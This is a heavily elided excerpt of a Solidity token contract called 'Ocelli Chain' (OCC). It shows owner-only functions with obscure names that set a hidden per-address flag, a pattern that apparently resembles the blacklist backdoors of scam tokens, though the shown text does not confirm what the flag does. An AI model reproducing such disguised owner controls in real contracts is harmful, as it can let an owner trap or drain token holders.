...
// Ocelli Chain is a Web3.0 interoperability protocol that enables cross-chain transfers of blockchain assets and data between blockchains.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Ocelli Chain';
    string constant public symbol = 'OCC';
    ...
    function OcelliKernelB(address account) public onlyOwner {
    ...
    function MaskedOcelli(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function WalletsAmmountOcelli(address account) public view returns (bool) {
...
contract OcelliChainProtocol is BaseToken {
